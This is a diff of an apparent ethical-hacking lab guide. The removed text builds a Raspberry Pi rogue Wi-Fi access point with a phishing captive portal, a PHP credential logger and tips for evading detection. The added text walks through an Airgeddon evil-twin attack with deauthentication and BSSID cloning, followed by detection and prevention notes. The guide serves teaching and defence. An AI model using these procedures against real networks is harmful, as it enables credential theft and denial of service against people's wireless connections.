@@ -1,583 +1,367 @@
-# Raspberry Pi Rogue Access Point + Captive Portal Lab Setup
+# Airgeddon Lab – Evil Twin + Deauthentication + Captive Portal
 
-### Ethical Hacking Project – Rogue AP & Credential Harvesting
+## Ethical Hacking Project – Rogue Access Point Attack Simulation
 
-This guide describes how to build a **rogue wireless access point with a captive portal** using a **Raspberry Pi running Kali Linux**. The environment is isolated using a **mobile phone hotspot** as the upstream internet connection.
+---
 
-This setup replicates a realistic wireless phishing attack scenario where a victim connects to a malicious Wi-Fi network and is redirected to a fake login portal.
+# Goal
 
-⚠️ **Important:**
-This lab must only be performed in a **controlled environment using your own devices**. Do not run rogue access points on public or institutional networks.
+The goal of this lab is to demonstrate how an attacker can perform an Evil Twin attack using Airgeddon by combining deauthentication, access point impersonation, and a captive portal to achieve credential harvesting in a controlled environment.
+
+---
+
+# Summary
+
+This lab demonstrates how multiple wireless attack techniques can be chained together to create an Adversary-in-the-Middle position. The attacker forces clients to disconnect from a legitimate network, lures them into connecting to a fake access point, and presents a captive portal to collect credentials.
+
+---
+
+# Background
+
+This lab assumes basic knowledge of:
+
+* Wi-Fi networking (SSID, BSSID, channels)
+* WPA2 authentication
+* Linux/Kali Linux usage
+* Basic networking concepts (DNS, DHCP)
+
+---
+
+# Lab Scenario
+
+In this scenario, an attacker targets a WPA2-protected wireless network. By performing a deauthentication attack, the attacker forces connected clients to disconnect. The attacker then presents a rogue access point with the same SSID. When the victim reconnects, they are redirected to a captive portal where credentials can be harvested.
 
 ---
 
 # Lab Architecture
 
 ```
-Internet
-   │
-Phone Hotspot
-   │
- wlan0
-Raspberry Pi (Attacker)
-   │
- wlan1 (USB WiFi Adapter)
-   │
-Rogue WiFi Network
-   │
+Real WiFi Network
+        │
+   (Deauthentication Attack)
+        ↓
 Victim Device
-   │
+        ↓
+Fake Access Point (Evil Twin)
+        ↓
 Captive Portal
-   │
+        ↓
 Credential Harvesting
-```
-
-Interface roles:
-
-```
-wlan0 → Connects to phone hotspot (internet)
-wlan1 → Rogue access point
 ```
 
 ---
 
 # Hardware Requirements
 
-### Attacker Device
+## Attacker Device
 
-* Raspberry Pi 3 / 4 / Zero 2 W
-* MicroSD card (16GB+)
-* USB Wi-Fi adapter supporting AP mode
+* Raspberry Pi (Kali Linux)
+* USB Wi-Fi adapter (monitor mode + packet injection support)
 
-Example adapter used:
+## Victim Device
 
-```
-Alfa AWUS036AXML
-```
-
-### Victim Device
-
-* Smartphone
-* Laptop
-* Virtual machine
-
-### Internet Source
-
-* Personal mobile hotspot
+* Smartphone or laptop
 
 ---
 
-# Step 1 – Install Kali Linux on Raspberry Pi
-
-Download the **Kali Linux Raspberry Pi image** from:
-
-```
-https://www.kali.org/get-kali/
-```
-
-Flash the image using:
-
-* Raspberry Pi Imager
-* Balena Etcher
-
-Insert the SD card and boot the Raspberry Pi.
-
-Default login:
-
-```
-username: kali
-password: kali
-```
-
-Update the system:
+# Step 1 – Start Airgeddon
 
 ```bash
-sudo apt update
-sudo apt upgrade -y
+sudo airgeddon
 ```
 
 ---
 
-# Step 2 – Connect Raspberry Pi to Phone Hotspot
+# Step 2 – Interface Selection
 
-Enable **WiFi tethering on your phone**.
-
-Scan networks:
-
-```bash
-nmcli dev wifi list
-```
-
-Connect to the hotspot:
-
-```bash
-nmcli dev wifi connect "HotspotName" password "password"
-```
-
-Verify network interfaces:
-
-```bash
-ip a
-```
-
-Example output:
+Airgeddon will prompt:
 
 ```
-wlan0 → connected to hotspot
-wlan1 → USB wireless adapter
+Select an interface to work with:
+```
+
+Select your external wireless interface (e.g., wlan1).
+
+**Important:**
+
+* Ensure the interface supports monitor mode and packet injection
+* External adapters are strongly recommended
+
+---
+
+# Step 3 – Main Menu Navigation
+
+You will now see the main menu.
+
+Select:
+
+```
+7. Evil Twin attacks menu
 ```
 
 ---
 
-# Step 3 – Install Required Packages
+# Step 4 – Enable Monitor Mode
 
-Install networking services and web server:
+Inside the Evil Twin menu:
 
-```bash
-sudo apt install hostapd dnsmasq lighttpd php -y
+```
+Put interface in monitor mode
 ```
 
-Stop services before configuration:
+This will create a monitor interface (e.g., wlan1mon).
 
-```bash
-sudo systemctl stop hostapd
-sudo systemctl stop dnsmasq
+**Why this is required:**
+
+* Enables packet sniffing
+* Allows injection of deauthentication frames
+
+---
+
+# Step 5 – Scan for Target Networks
+
+Select:
+
+```
+Explore for targets (monitor mode needed)
+```
+
+Airgeddon will begin scanning nearby networks.
+
+Once the scan completes:
+
+* Identify the target network
+* Note:
+
+  * SSID
+  * BSSID
+  * Channel
+
+Select the correct target network.
+
+---
+
+# Step 6 – Launch Evil Twin Attack
+
+Select:
+
+```
+Evil Twin AP attack with captive portal
 ```
 
 ---
 
-# Step 4 – Configure Static IP for Rogue Access Point
+# Step 7 – Select Deauthentication Method
 
-Edit dhcpcd configuration:
-
-```bash
-sudo nano /etc/dhcpcd.conf
-```
-
-Add the following lines:
+Options:
 
 ```
-interface wlan1
-static ip_address=192.168.4.1/24
+1. Deauth / disassoc mdk4 attack
+2. Deauth aireplay-ng attack
+3. Auth DoS attack
 ```
 
-Restart networking:
+## Explanation of Methods
 
-```bash
-sudo service dhcpcd restart
-```
+### Deauth / disassoc mdk4 attack
 
-Verify the address:
+* High-volume packet injection
+* Targets multiple clients simultaneously
+* More aggressive and faster
+* Higher detectability
 
-```bash
-ip a
-```
+### Deauth aireplay-ng attack (Recommended)
 
-Expected:
+* Stable and widely supported
+* Precise targeting
+* Lower noise level
+* Reliable in most environments
 
-```
-192.168.4.1
-```
+### Auth DoS attack
+
+* Floods AP with authentication requests
+* Prevents legitimate connections
+* Does not rely on deauth frames
+* Useful if deauth is blocked (e.g., 802.11w)
 
 ---
 
-# Step 5 – Configure DHCP and DNS Redirection
+# Step 8 – DoS Pursuit Mode
 
-Backup the original configuration:
+Enable when prompted.
 
-```bash
-sudo mv /etc/dnsmasq.conf /etc/dnsmasq.conf.orig
-```
+**Function:**
 
-Create a new configuration:
-
-```bash
-sudo nano /etc/dnsmasq.conf
-```
-
-Add:
-
-```
-interface=wlan1
-dhcp-range=192.168.4.10,192.168.4.100,255.255.255.0,24h
-address=/#/192.168.4.1
-```
-
-This configuration:
-
-* assigns IP addresses to victims
-* redirects all DNS requests to the captive portal
+* Continuously sends deauthentication traffic
+* Prevents victim from reconnecting to real AP
 
 ---
 
-# Step 6 – Configure the Rogue Access Point
+# Step 9 – MAC Address Spoofing
 
-Create hostapd configuration:
+Enable when prompted.
 
-```bash
-sudo nano /etc/hostapd/hostapd.conf
-```
+**Function:**
 
-Example configuration:
-
-```
-interface=wlan1
-driver=nl80211
-ssid=Campus_Guest_WiFi
-hw_mode=g
-channel=6
-macaddr_acl=0
-ignore_broadcast_ssid=0
-```
-
-Enable the configuration:
-
-```bash
-sudo nano /etc/default/hostapd
-```
-
-Set:
-
-```
-DAEMON_CONF="/etc/hostapd/hostapd.conf"
-```
+* Clones BSSID of target AP
+* Increases likelihood of client trust
 
 ---
 
-# Step 7 – Start the Rogue Access Point
+# Step 10 – Handshake Handling
 
-Start services:
+Choose:
 
-```bash
-sudo systemctl start hostapd
-sudo systemctl start dnsmasq
-```
+* Use existing handshake
+* Capture a new handshake
 
-Verify that the wireless network appears:
+If capturing:
 
-```
-Campus_Guest_WiFi
-```
+* Set timeout (recommended: 30–60 seconds)
 
-This represents the **Initial Access stage** of the attack.
+**Purpose:**
 
----
-
-# Step 8 – Create the Captive Portal
-
-Navigate to the web server directory:
-
-```bash
-cd /var/www/html
-```
-
-Remove the default page:
-
-```bash
-sudo rm index.html
-```
-
-Create the login page:
-
-```bash
-sudo nano index.html
-```
-
-Example captive portal:
-
-```html
-<h2>Campus Guest WiFi Login</h2>
-
-<form method="POST" action="login.php">
-Email:<br>
-<input type="text" name="username"><br>
-
-Password:<br>
-<input type="password" name="password"><br><br>
-
-<input type="submit" value="Login">
-</form>
-```
+* Verify Wi-Fi password entered in captive portal
+* Enable offline cracking as backup
 
 ---
 
-# Step 9 – Create Credential Logger
+# Step 11 – Captive Portal Selection
 
-Create a PHP script:
+Choose:
 
-```bash
-sudo nano login.php
-```
+* Default captive portal
+* Custom captive portal
 
-Add:
-
-```php
-<?php
-
-file_put_contents("creds.txt",
-"User: ".$_POST['username']." Pass: ".$_POST['password']."\n",
-FILE_APPEND);
-
-header("Location: https://google.com");
-
-?>
-```
-
-Captured credentials will be stored in:
-
-```
-/var/www/html/creds.txt
-```
+**Recommended:**
+Wi-Fi password verification portal
 
 ---
 
-# Step 10 – Start the Web Server
+# Step 12 – Save Script
 
-Start Lighttpd:
-
-```bash
-sudo systemctl start lighttpd
-```
-
-The captive portal is now active.
+Choose default or specify path.
 
 ---
 
-# Step 11 – Test the Attack
+# Step 13 – Execute Attack
 
-On the victim device:
+Airgeddon will:
 
-1. Connect to:
-
-```
-Campus_Guest_WiFi
-```
-
-2. Open a web browser
-
-3. The captive portal appears
-
-4. Enter login credentials
-
-Example captured credentials:
-
-```
-User: victim@email.com
-Pass: password123
-```
-
-View the captured data:
-
-```bash
-cat /var/www/html/creds.txt
-```
+1. Launch deauthentication
+2. Start fake AP
+3. Force client reconnection
+4. Display captive portal
+5. Capture credentials
 
 ---
 
-# Step 12 – Discover Connected Devices
+# Step 14 – Monitoring
 
-Display connected clients:
+Observe:
 
-```bash
-iw dev wlan1 station dump
-```
-
-Example output:
-
-```
-MAC address
-signal strength
-connection time
-```
-
-This supports the **Discovery stage** in the attack chain.
+* Deauthentication activity
+* Client reconnections
+* Captive portal requests
+* Captured credentials
 
 ---
 
-# Step 13 – Optional: Capture Network Traffic
+# MITRE ATT&CK Mapping
 
-For deeper analysis, capture network traffic:
-
-```bash
-sudo tcpdump -i wlan1
-```
-
-This can show:
-
-```
-DNS requests
-HTTP redirects
-login POST requests
-```
-
-This step demonstrates **network traffic interception and analysis**.
+| Technique ID | Name                          | Description                                            |
+| ------------ | ----------------------------- | ------------------------------------------------------ |
+| T1557        | Adversary-in-the-Middle       | Evil Twin places attacker between victim and network   |
+| T1056        | Input Capture                 | Captive portal captures user credentials               |
+| T1556        | Modify Authentication Process | Fake portal mimics authentication to steal credentials |
+| T1110        | Credential Access             | Credentials obtained via portal                        |
+| T1046        | Network Service Discovery     | Scanning for wireless targets                          |
 
 ---
 
-# Step 14 – Stop the Lab
+# Attack Lifecycle Mapping
 
-Stop all services when finished:
-
-```bash
-sudo systemctl stop hostapd
-sudo systemctl stop dnsmasq
-sudo systemctl stop lighttpd
-```
-
----
-
-# Improvements & Extensions
-
-This lab demonstrates a basic rogue access point with a captive portal, but it can be further improved to be more realistic, stealthy, and technically advanced through several enhancements.
+| Stage             | Description           |
+| ----------------- | --------------------- |
+| Reconnaissance    | Network scanning      |
+| Initial Access    | Evil Twin AP          |
+| Execution         | Deauthentication      |
+| MitM              | Traffic interception  |
+| Credential Access | Captive portal        |
+| Persistence       | DoS pursuit mode      |
+| Impact            | Credential compromise |
 
 ---
 
-## 1. Reduce Attacker Visibility (Stealth Improvements)
+# Detection
 
-**Goal:** Make the attacker infrastructure harder to detect.
+Indicators of attack:
 
-* **Hide the upstream hotspot SSID**
-
-  * Disable SSID broadcast on your phone hotspot
-  * Prevents easy correlation between attacker device and internet source
-
-* **Rename interfaces and hostname**
-
-  ```bash
-  sudo hostnamectl set-hostname printer-service
-  ```
-
-  * Makes the device look less suspicious on networks
-
-* **Lower transmission power (optional)**
-
-  ```bash
-  iwconfig wlan1 txpower 10
-  ```
-
-  * Reduces physical detection range
-
-* **MAC address randomization**
-
-  ```bash
-  macchanger -r wlan1
-  ```
-
-  * Avoids hardware fingerprinting
+* Multiple APs with identical SSIDs
+* High volume of deauthentication frames
+* Sudden client disconnections
+* Rogue DHCP/DNS behavior
+* Unexpected captive portal redirects
+* Certificate warnings in browser
 
 ---
 
-## 2. Improve Captive Portal Realism
+# Prevention
 
-**Goal:** Increase likelihood of user interaction.
-
-* **Clone real login portals**
-
-  * Copy HTML/CSS from legitimate networks (e.g., hotel, campus)
-  * Tools like:
-
-    * `wget`
-    * browser dev tools
-
-* **Add branding elements**
-
-  * Logos
-  * Terms of service
-  * “Accept & Continue” buttons
-
-* **Implement HTTPS (important realism factor)**
-
-  * Use self-signed certificates or tools like:
-
-    * `sslstrip` (lab only)
-  * Note: modern browsers will warn users
-
-* **Device-specific portals**
-
-  * Serve different pages for:
-
-    * iOS captive portal detection
-    * Android connectivity check
+* WPA3 or WPA2-Enterprise (802.1X)
+* Protected Management Frames (802.11w)
+* Wireless IDS/WIPS
+* Certificate validation enforcement
+* User awareness training
 
 ---
 
-## 3. Add Internet Access After Login
+# Analysis
 
-**Goal:** Make the attack less suspicious by providing real connectivity.
+This attack is effective due to:
 
-* Enable NAT forwarding:
+* Automatic Wi-Fi reconnection behavior
+* Trust in known SSIDs
+* User familiarity with captive portals
 
-```bash
-echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
-```
-
-* Configure iptables:
-
-```bash
-sudo iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
-sudo iptables -A FORWARD -i wlan1 -o wlan0 -j ACCEPT
-```
-
-* Result:
-
-  * Victim gets internet access after submitting credentials
-  * Reduces suspicion significantly
+However, HTTPS, HSTS, and certificate validation significantly reduce the ability to intercept sensitive data.
 
 ---
 
-## 4. Persistence & Automation
+# Demonstration Plan
 
-**Goal:** Make the setup reusable and autonomous.
-
-* Create a startup script:
-
-```bash
-sudo systemctl enable hostapd
-sudo systemctl enable dnsmasq
-sudo systemctl enable lighttpd
-```
-
-* Or build a single launch script:
-
-```bash
-#!/bin/bash
-systemctl start hostapd
-systemctl start dnsmasq
-systemctl start lighttpd
-```
-
-* Turn the Pi into a “plug-and-play” rogue AP device
-
+1. Scan for nearby networks
+2. Select target AP
+3. Launch Evil Twin attack
+4. Show deauthentication effect
+5. Connect victim device
+6. Display captive portal
+7. Capture credentials
 
 ---
 
-# Mapping to the Attack Lifecycle
+# Student Questions
 
-| Stage             | Demonstration                |
-| ----------------- | ---------------------------- |
-| Setup             | Raspberry Pi configuration   |
-| Initial Access    | Rogue WiFi network           |
-| Execution         | DNS redirection              |
-| Credential Access | Captive portal login         |
-| Discovery         | Connected client enumeration |
-| Command & Control | Credential logging           |
-| Exfiltration      | Exporting credential logs    |
-| Impact            | Account compromise           |
+1. Why is monitor mode required in this attack?
+2. What is the purpose of deauthentication?
+3. What is the difference between mdk4 and aireplay-ng?
+4. When would an attacker use Auth DoS instead of deauth?
+5. Why is MAC spoofing important?
+6. What role does the handshake play?
 
 ---
 
-# Security Considerations
+# Answers
 
-To prevent similar attacks, organizations should implement:
-
-* WPA3 or enterprise authentication (802.1X)
-* Wireless Intrusion Detection Systems (WIDS)
-* DNS monitoring
-* user security awareness training
-* certificate validation enforcement
+1. Monitor mode allows packet capture and injection.
+2. Deauthentication forces clients to reconnect to the attacker’s AP.
+3. mdk4 is more aggressive and targets multiple clients, while aireplay-ng is more stable and precise.
+4. Auth DoS is used when deauthentication is blocked or ineffective.
+5. MAC spoofing increases the likelihood of client trust and connection.
+6. The handshake allows verification or offline cracking of the Wi-Fi password.
 
 ---
 
 # Disclaimer
 
-This project is intended **only for educational purposes within a controlled laboratory environment**. The techniques demonstrated here must **not be used against networks or devices without explicit authorization**.
+This lab is intended strictly for educational purposes in controlled environments using authorized devices only.
